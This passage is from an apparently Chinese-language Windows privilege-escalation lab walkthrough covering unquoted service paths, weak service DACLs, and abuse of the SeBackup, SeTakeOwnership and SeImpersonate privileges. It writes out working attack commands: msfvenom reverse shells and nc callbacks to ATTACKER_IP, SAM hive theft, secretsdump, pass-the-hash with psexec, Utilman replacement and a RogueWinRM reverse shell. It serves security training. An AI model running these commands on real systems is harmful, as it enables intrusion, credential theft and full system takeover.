<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; sc qc <span class="hljs-string">&quot;disk sorter enterprise&quot;</span><br>[SC] QueryServiceConfig SUCCESS<br><br>SERVICE_NAME: disk sorter enterprise<br>        TYPE               : <span class="hljs-number">10</span>  WIN32_OWN_PROCESS<br>        START_TYPE         : <span class="hljs-number">2</span>   AUTO_START<br>        ERROR_CONTROL      : <span class="hljs-number">0</span>   IGNORE<br>        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe<br>        LOAD_ORDER_GROUP   :<br>        TAG                : <span class="hljs-number">0</span><br>        DISPLAY_NAME       : Disk Sorter Enterprise<br>        DEPENDENCIES       :<br>        SERVICE_START_NAME : .\svcusr2<br></code></pre></td></tr></table></figure>
<p>当 SCM 尝试执行关联的二进制文件时，就会出现问题。由于“Disk Sorter Enterprise”文件夹的名称上有空格，因此该命令变得不明确，并且 SCM 不知道您正在尝试执行以下哪一个：</p>
<table>
<thead>
<tr>
<th>Command</th>
<th>Argument 1</th>
<th>Argument 2</th>
</tr>
</thead>
<tbody>
<tr>
<td>C:\MyPrograms\Disk.exe</td>
<td>Sorter</td>
<td>Enterprise\bin\disksrs.exe</td>
</tr>
<tr>
<td>C:\MyPrograms\Disk Sorter.exe</td>
<td>Enterprise\bin\disksrs.exe</td>
<td></td>
</tr>
<tr>
<td>C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe</td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>这与命令提示符如何解析命令有关。通常，当您发送命令时，空格将用作参数分隔符，除非它们是带引号的字符串的一部分。这意味着未加引号的命令的“正确”解释是执行 <code>C:\\MyPrograms\\Disk.exe</code> 并将其余部分作为参数。</p>
<p>SCM 没有像它可能应该发生的那样失败，而是尝试帮助用户并开始按照表中所示的顺序搜索每个二进制文件：</p>
<ol>
<li>首先，搜索 <code>C:\\MyPrograms\\Disk.exe</code> 。如果存在，该服务将运行此可执行文件。</li>
<li>如果后者不存在，它将搜索 <code>C:\\MyPrograms\\Disk Sorter.exe</code> 。如果存在，该服务将运行此可执行文件。</li>
<li>如果后者不存在，它将搜索 <code>C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe</code> 。此选项预计会成功，并且通常会在默认安装中运行。</li>
</ol>
<p>从这个行为来看，问题就显而易见了。如果攻击者创建了在预期服务可执行文件之前搜索的任何可执行文件，他们就可以强制服务运行任意可执行文件。</p>
<p>虽然这听起来微不足道，但默认情况下，大多数服务可执行文件将安装在 <code>C:\Program Files</code> 或 <code>C:\Program Files (x86)</code> 下，非特权用户无法写入。这可以防止任何易受攻击的服务被利用。此规则也有例外： - 某些安装程序更改已安装文件夹的权限，使服务容易受到攻击。 - 管理员可能决定将服务二进制文件安装在非默认路径中。如果这样的路径是全局可写的，则该漏洞可以被利用。</p>
<p>在我们的例子中，管理员在 <code>c:\MyPrograms</code> 下安装了磁盘排序器二进制文件。默认情况下，它继承 <code>C:\</code> 目录的权限，允许任何用户在其中创建文件和文件夹。我们可以使用 <code>icacls</code> 来检查：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt;icacls c:\MyPrograms<br>c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)<br>              BUILTIN\Administrators:(I)(OI)(CI)(F)<br>              BUILTIN\Users:(I)(OI)(CI)(RX)<br>              BUILTIN\Users:(I)(CI)(AD)<br>              BUILTIN\Users:(I)(CI)(WD)<br>              CREATOR OWNER:(I)(OI)(CI)(IO)(F)<br><br>Successfully processed <span class="hljs-number">1</span> files; Failed processing <span class="hljs-number">0</span> files<br></code></pre></td></tr></table></figure>
<p><code>BUILTIN\\Users</code> 组拥有AD和WD权限，分别允许用户创建子目录和文件。</p>
<p>使用 msfvenom 创建 exe-service Payload 并将其传输到目标主机的过程与以前相同，因此请像以前一样创建以下 Payload 并将其上传到服务器。我们还将启动一个侦听器来接收反向 shell 执行时的情况：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">4446</span> -f exe-service -o rev-svc2.exe<br><br>user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4446</span><br></code></pre></td></tr></table></figure>
<p>一旦有效负载进入服务器，请将其移动到可能发生劫持的任何位置。在这种情况下，我们将把有效负载移动到 <code>C:\MyPrograms\Disk.exe</code> 。我们还将授予每个人对该文件的完全权限，以确保该服务可以执行该文件：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe<br><br>C:\&gt; icacls C:\MyPrograms\Disk.exe /grant Everyone:F<br>        Successfully processed <span class="hljs-number">1</span> files.<br></code></pre></td></tr></table></figure>
<p>服务重新启动后，您的有效负载应该执行：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; sc stop <span class="hljs-string">&quot;disk sorter enterprise&quot;</span><br>C:\&gt; sc start <span class="hljs-string">&quot;disk sorter enterprise&quot;</span><br></code></pre></td></tr></table></figure>
<p>结果，您将获得具有 svcusr2 权限的反向 shell：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4446</span><br>Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">4446</span><br>Connection received on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span> <span class="hljs-number">50650</span><br>Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.1821</span>]<br>(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.<br><br><span class="hljs-attribute">C</span>:\Windows\system32&gt;whoami<br>wprivesc1\svcusr2<br></code></pre></td></tr></table></figure>
<h2 id="4-6-不安全的服务权限"><a href="#4-6-不安全的服务权限" class="headerlink" title="4-6-不安全的服务权限"></a>4.6 不安全的服务权限</h2>
<p>如果服务的可执行 DACL 配置良好，并且正确引用了服务的二进制路径，那么您仍然有机会利用该服务。如果服务 DACL（不是服务的可执行 DACL）允许您修改服务的配置，您将能够重新配置该服务。这将允许您指向所需的任何可执行文件并使用您喜欢的任何帐户运行它，包括 SYSTEM 本身。</p>
<p>要从命令行检查服务 DACL，您可以使用 Sysinternals 套件中的 Accesschk。为了您的方便，可在 <code>C:\\tools</code> 获取副本。检查 thmservice 服务 DACL 的命令是：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\tools\AccessChk&gt; accesschk64.exe -qlc thmservice<br>  [<span class="hljs-number">0</span>] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM<br>        SERVICE_QUERY_STATUS<br>        SERVICE_QUERY_CONFIG<br>        SERVICE_INTERROGATE<br>        SERVICE_ENUMERATE_DEPENDENTS<br>        SERVICE_PAUSE_CONTINUE<br>        SERVICE_START<br>        SERVICE_STOP<br>        SERVICE_USER_DEFINED_CONTROL<br>        READ_CONTROL<br>  [<span class="hljs-number">4</span>] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users<br>        SERVICE_ALL_ACCESS<br></code></pre></td></tr></table></figure>
<p>这里我们可以看到 <code>BUILTIN\\Users</code> 组拥有SERVICE_ALL_ACCESS权限，这意味着任何用户都可以重新配置服务。</p>
<p>在更改服务之前，让我们构建另一个 exe-service 反向 shell，并在攻击者的计算机上启动它的侦听器：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=<span class="hljs-number">4447</span> -f exe-service -o rev-svc3.exe<br><br>user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4447</span><br></code></pre></td></tr></table></figure>
<p>然后，我们将反向 shell 可执行文件传输到目标机器并将其存储在 <code>C:\Users\thm-unpriv\rev-svc3.exe</code> 中。请随意使用 wget 传输您的可执行文件并将其移动到所需的位置。请记住授予每个人执行您的有效负载的权限：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F<br></code></pre></td></tr></table></figure>
<p>要更改服务关联的可执行文件和帐户，我们可以使用以下命令（使用 sc.exe 时请注意等号后面的空格）：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; sc config THMService binPath= <span class="hljs-string">&quot;C:\Users\thm-unpriv\rev-svc3.exe&quot;</span> obj= LocalSystem<br></code></pre></td></tr></table></figure>
<p>请注意，我们可以使用任何帐户来运行该服务。我们选择 LocalSystem，因为它是可用的最高特权帐户。要触发我们的有效负载，剩下的就是重新启动服务：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; sc stop THMService<br>C:\&gt; sc start THMService<br></code></pre></td></tr></table></figure>
<p>我们将在攻击者的机器上收到一个具有系统权限的 shell：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4447</span><br>Listening on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> <span class="hljs-number">4447</span><br>Connection received on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span> <span class="hljs-number">50650</span><br>Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.1821</span>]<br>(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.<br><br><span class="hljs-attribute">C</span>:\Windows\system32&gt;whoami<br>NT AUTHORITY\SYSTEM<br></code></pre></td></tr></table></figure>
<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3>
<p>权限是帐户执行特定系统相关任务所拥有的权利。这些任务可以像关闭计算机的权限一样简单，也可以像绕过某些基于 DACL 的访问控制的权限一样简单。</p>
<p>每个用户都有一组分配的权限，可以使用以下命令进行检查：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">whoami /priv<br></code></pre></td></tr></table></figure>
<p>此处提供了 Windows 系统上可用权限的完整列表。从攻击者的角度来看，只有那些允许我们在系统中升级的权限才有意义。您可以在 Priv2Admin Github 项目上找到可利用权限的完整列表。</p>
<p>虽然我们不会逐一查看，但我们将展示如何滥用您可以找到的一些最常见的特权。</p>
<h2 id="4-7-SeBackup-SeRestore"><a href="#4-7-SeBackup-SeRestore" class="headerlink" title="4-7-SeBackup-SeRestore"></a>4.7 SeBackup / SeRestore</h2>
<p>SeBackup 和 SeRestore 权限允许用户读取和写入系统中的任何文件，忽略任何 DACL。此权限背后的想法是允许某些用户从系统执行备份，而无需完全管理权限。</p>
<p>有了这种能力，攻击者可以使用多种技术轻松提升系统权限。我们将研究的方法包括复制 SAM 和 SYSTEM 注册表配置单元以提取本地管理员的密码哈希值。</p>
<p>接下来实操的帐户属于“Backup Operators”组，默认情况下被授予 SeBackup 和 SeRestore 权限。我们需要使用“以管理员身份打开”选项打开命令提示符才能使用这些权限。我们将被要求再次输入密码以获得提升的控制台：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104544115.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104544115.png" alt="image-20240206104544115"></p>
<p>进入命令提示符后，我们可以使用以下命令检查我们的权限：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; whoami /priv<br><br>PRIVILEGES INFORMATION<br>----------------------<br><br>Privilege Name                Description                    State<br>============================= ============================== ========<br>SeBackupPrivilege             Back up files and directories  Disabled<br>SeRestorePrivilege            Restore files and directories  Disabled<br>SeShutdownPrivilege           Shut down the system           Disabled<br>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working set Disabled<br></code></pre></td></tr></table></figure>
<p>要备份 SAM 和 SYSTEM 哈希值，我们可以使用以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; reg save hklm\system C:\Users\THMBackup\system.hive<br>The operation completed successfully.<br><br>C:\&gt; reg save hklm\sam C:\Users\THMBackup\sam.hive<br>The operation completed successfully.<br></code></pre></td></tr></table></figure>
<p>这将创建几个包含注册表配置单元内容的文件。现在，我们可以使用 SMB 或任何其他可用方法将这些文件复制到攻击者计算机。对于 SMB，我们可以使用 impacket 的 <code>smbserver.py</code> 在 AttackBox 的当前目录中启动一个带有网络共享的简单 SMB 服务器：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ mkdir share<br>user<span class="hljs-keyword">@attackerpc</span>$ python3.<span class="hljs-number">9</span> /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share<br></code></pre></td></tr></table></figure>
<p>这将创建一个名为 <code>public</code> 的共享，指向 <code>share</code> 目录，该目录需要当前 Windows 会话的用户名和密码。之后，我们可以在 Windows 机器中使用 <code>copy</code> 命令将这两个文件传输到 AttackBox：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\<br>C:\&gt; copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\<br></code></pre></td></tr></table></figure>
<p>并使用 impacket 检索用户的密码哈希值：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ python3.<span class="hljs-number">9</span> /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL<br>Impacket v0.<span class="hljs-number">9.24</span>.dev1+<span class="hljs-number">20210704.162046</span>.<span class="hljs-number">29</span>ad5792 - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation<br><br>[*] Target system <span class="hljs-attribute">bootKey</span>: <span class="hljs-number">0</span>x36c8d26ec0df8b23ce63bcefa6e2d821<br>[*] Dumping local SAM hashes (<span class="hljs-attribute">uid</span>:<span class="hljs-attribute">rid</span>:<span class="hljs-attribute">lmhash</span>:nthash)<br><span class="hljs-attribute">Administrator</span>:<span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404<span class="hljs-attribute">ee</span>:<span class="hljs-number">13</span>a04cdcf3f7ec41264e568127c5ca94:::<br><span class="hljs-attribute">Guest</span>:<span class="hljs-number">501</span>:aad3b435b51404eeaad3b435b51404<span class="hljs-attribute">ee</span>:<span class="hljs-number">31</span>d6cfe0d16ae931b73c59d7e0c089c0:::<br></code></pre></td></tr></table></figure>
<p>我们终于可以使用管理员的哈希来执行哈希传递攻击并获得具有系统权限的目标计算机的访问权限：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ python3.<span class="hljs-number">9</span> /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404<span class="hljs-attribute">ee</span>:<span class="hljs-number">13</span>a04cdcf3f7ec41264e568127c5ca94 administrator<span class="hljs-keyword">@MACHINE</span>_IP<br>Impacket v0.<span class="hljs-number">9.24</span>.dev1+<span class="hljs-number">20210704.162046</span>.<span class="hljs-number">29</span>ad5792 - Copyright <span class="hljs-number">2021</span> SecureAuth Corporation<br><br>[*] Requesting shares on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span>.....<br>[*] Found writable share ADMIN$<br>[*] Uploading file nfhtabqO.exe<br>[*] Opening SVCManager on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span>.....<br>[*] Creating service RoLE on <span class="hljs-number">10.10</span>.<span class="hljs-number">175.90</span>.....<br>[*] Starting service RoLE.....<br>[!] Press help for extra shell commands<br>Microsoft Windows [Version <span class="hljs-number">10.0</span>.<span class="hljs-number">17763.1821</span>]<br>(c) <span class="hljs-number">2018</span> Microsoft Corporation. All rights reserved.<br><br><span class="hljs-attribute">C</span>:\Windows\system32&gt; whoami<br>nt authority\system<br></code></pre></td></tr></table></figure>
<h2 id="4-8-SeTakeOwnership"><a href="#4-8-SeTakeOwnership" class="headerlink" title="4-8-SeTakeOwnership"></a>4.8 SeTakeOwnership</h2>
<p>SeTakeOwnership 权限允许用户获取系统上任何对象的所有权，包括文件和注册表项，这为攻击者提升权限提供了多种可能性，例如，我们可以搜索作为 SYSTEM 运行的服务并获取所有权服务的可执行文件。然而，对于这项任务，我们将采取不同的路线。</p>
<p>要获得 SeTakeOwnership 权限，我们需要使用“以管理员身份打开”选项打开命令提示符。我们将被要求输入密码以获得提升的控制台：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104653145.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104653145.png" alt="image-20240206104653145"></p>
<p>进入命令提示符后，我们可以使用以下命令检查我们的权限：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; whoami /priv<br><br>PRIVILEGES INFORMATION<br>----------------------<br><br>Privilege Name                Description                              State<br>============================= ======================================== ========<br>SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled<br>SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled<br>SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled<br></code></pre></td></tr></table></figure>
<p>这次我们将滥用 <code>utilman.exe</code> 来升级权限。 Utilman 是一个内置的 Windows 应用程序，用于在锁定屏幕期间提供“轻松访问”选项：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104707798.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104707798.png" alt="image-20240206104707798"></p>
<p>由于 Utilman 是以 SYSTEM 权限运行的，因此如果我们将原始二进制文件替换为我们喜欢的任何有效负载，我们将有效地获得 SYSTEM 权限。由于我们可以拥有任何文件的所有权，因此替换它是微不足道的。</p>
<p>要替换 utilman，我们将首先使用以下命令获取它的所有权：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; takeown /f C:\Windows\System32\Utilman.exe<br><br>SUCCESS: The file (or folder): <span class="hljs-string">&quot;C:\Windows\System32\Utilman.exe&quot;</span> now owned by user <span class="hljs-string">&quot;WINPRIVESC2\thmtakeownership&quot;</span>.<br></code></pre></td></tr></table></figure>
<p>请注意，成为文件的所有者并不一定意味着您拥有该文件的权限，但作为所有者，您可以为自己分配所需的任何权限。要为您的用户授予 utilman.exe 的完全权限，您可以使用以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F<br>processed file: Utilman.exe<br>Successfully processed <span class="hljs-number">1</span> files; Failed processing <span class="hljs-number">0</span> files<br></code></pre></td></tr></table></figure>
<p>之后，我们将用 cmd.exe 的副本替换 utilman.exe：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\Windows\System32\&gt; copy cmd.exe utilman.exe<br>        <span class="hljs-number">1</span> <span class="hljs-built_in">file</span>(s) copied.<br></code></pre></td></tr></table></figure>
<p>要触发 utilman，我们将从开始按钮锁定屏幕：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104737094.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104737094.png" alt="image-20240206104737094"></p>
<p>最后，继续单击“轻松访问”按钮，该按钮将以系统权限运行 utilman.exe。由于我们将其替换为 cmd.exe 副本，因此我们将获得具有 SYSTEM 权限的命令提示符：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104746589.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104746589.png" alt="image-20240206104746589"></p>
<h2 id="4-9-SeImpersonate-SeAssignPrimaryToken"><a href="#4-9-SeImpersonate-SeAssignPrimaryToken" class="headerlink" title="4-9-SeImpersonate-SeAssignPrimaryToken"></a>4.9 SeImpersonate / SeAssignPrimaryToken</h2>
<p>这些权限允许进程模拟其他用户并代表他们执行操作。模拟通常包括能够在另一个用户的安全上下文下生成进程或线程。</p>
<p>当您考虑 FTP 服务器的工作原理时，就很容易理解模拟。 FTP 服务器必须限制用户只能访问他们应该被允许查看的文件。</p>
<p>假设我们有一个使用用户 <code>ftp</code> 运行的 FTP 服务。在没有模拟的情况下，如果用户 Ann 登录 FTP 服务器并尝试访问她的文件，FTP 服务将尝试使用其访问令牌而不是 Ann 的访问令牌来访问它们：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104812815.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104812815.png" alt="image-20240206104812815"></p>
<p>使用 ftp 令牌不是最好的主意有以下几个原因： - 为了正确提供文件， <code>ftp</code> 用户需要可以访问它们。在上面的示例中，FTP 服务将能够访问 Ann 的文件，但不能访问 Bill 的文件，因为 Bill 文件中的 DACL 不允许用户 <code>ftp</code> 。这增加了复杂性，因为我们必须为每个提供的文件/目录手动配置特定权限。 - 对于操作系统，所有文件均由用户 <code>ftp</code> 访问，与当前登录 FTP 服务的用户无关。这使得无法将授权委托给操作系统；因此，FTP服务必须实现它。 - 如果 FTP 服务在某个时刻遭到破坏，攻击者将立即获得对 <code>ftp</code> 用户有权访问的所有文件夹的访问权限。</p>
<p>另一方面，如果 FTP 服务的用户具有 SeImpersonate 或 SeAssignPrimaryToken 权限，则所有这些都会稍微简化，因为 FTP 服务可以临时获取登录用户的访问令牌，并使用它来执行其上的任何任务。代表：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104823603.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104823603.png" alt="image-20240206104823603"></p>
<p>现在，如果用户 Ann 登录到 FTP 服务，并且考虑到 ftp 用户具有模拟权限，则它可以借用 Ann 的访问令牌并使用它来访问她的文件。这样，文件不需要以任何方式向用户 <code>ftp</code> 提供访问权限，并且操作系统会处理授权。由于 FTP 服务正在冒充 Ann，因此在该会话期间它将无法访问 Jude 或 Bill 的文件。</p>
<p>作为攻击者，如果我们设法控制具有 SeImpersonate 或 SeAssignPrimaryToken 权限的进程，我们就可以模拟连接该进程并对其进行身份验证的任何用户。</p>
<p>在Windows系统中，你会发现LOCAL SERVICE和NETWORK SERVICE ACCOUNTS已经拥有这样的权限。由于这些帐户用于使用受限帐户生成服务，因此如果服务需要，允许它们模拟连接用户是有意义的。 Internet 信息服务 (IIS) 还将为 Web 应用程序创建一个名为“iis apppool\defaultapppool”的类似默认帐户。</p>
<p>要使用此类帐户提升权限，攻击者需要满足以下条件： 1. 生成一个进程，以便用户可以连接该进程并对其进行身份验证，以进行模拟。 2.找到一种方法来强制特权用户连接并验证生成的恶意进程。</p>
<p>我们将使用 RogueWinRM 漏洞来实现这两个条件。</p>
<p>首先，假设我们已经入侵了一个在 IIS 上运行的网站，并且我们已经在以下地址植入了 Web shell：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">http://MACHINE_IP/<br></code></pre></td></tr></table></figure>
<p>我们可以使用 Web shell 检查受感染帐户的分配权限，并确认我们拥有此任务感兴趣的两项权限：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104845464.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104845464.png" alt="image-20240206104845464"></p>
<p>要使用RogueWinRM，我们首先需要将漏洞利用程序上传到目标机器。为了您的方便，这已经完成，您可以在 <code>C:\tools\</code> 文件夹中找到该漏洞。</p>
<p>RogueWinRM 漏洞利用是可能的，因为每当用户（包括非特权用户）在 Windows 中启动 BITS 服务时，它都会使用系统权限自动创建到端口 5985 的连接。端口 5985 通常用于 WinRM 服务，它只是一个公开 Powershell 控制台以通过网络远程使用的端口。可以将其想象为 SSH，但使用 Powershell。</p>
<p>如果由于某种原因，WinRM 服务没有在受害服务器上运行，则攻击者可以在端口 5985 上启动伪造的 WinRM 服务，并在启动时捕获 BITS 服务进行的身份验证尝试。如果攻击者具有SeImpersonate权限，他可以代表连接用户（即SYSTEM）执行任何命令。</p>
<p>在运行漏洞之前，我们将启动一个 netcat 侦听器以在攻击者的计算机上接收反向 shell：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">user<span class="hljs-keyword">@attackerpc</span>$ nc -lvp <span class="hljs-number">4442</span><br></code></pre></td></tr></table></figure>
<p>然后，使用我们的 Web shell 使用以下命令触发 RogueWinRM 漏洞利用：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">c:\tools\RogueWinRM\RogueWinRM.exe -p <span class="hljs-string">&quot;C:\tools\nc64.exe&quot;</span> -a <span class="hljs-string">&quot;-e cmd.exe ATTACKER_IP 4442&quot;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104909061.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240206104909061.png" alt="image-20240206104909061"></p>
<p>注意：该漏洞可能需要长达 2 分钟才能发挥作用，因此您的浏览器可能会出现一段时间无响应。如果您多次运行漏洞利用程序，就会发生这种情况，因为它必须等待 BITS 服务停止才能再次启动。 BITS服务将在启动2分钟后自动停止。</p>
